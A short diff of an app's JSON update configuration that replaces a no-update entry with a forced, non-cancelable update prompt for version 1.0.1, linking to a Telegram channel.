@@ -1,9 +1,11 @@
 {
-  "versionCode": 9999,
-  "versionName": "9.9.9",
-  "updateType": "none",
-  "isForceUpdate": false,
-  "minSupportedVersion": 1,
-  "releaseNotes": "Performance improvements and bug fixes.",
-  "downloadUrl": "https://github.com/sepiso100/app-updates"
+  "force_update": true,
+  "min_version": 1,
+  "latest_version": "1.0.1",
+  "title": "Update Required",
+  "message": "A new version of the app is available. Please update to continue.",
+  "positive_button": "Update",
+  "negative_button": "",
+  "cancelable": false,
+  "update_url": "https://t.me/tpxapkupdates"
 }
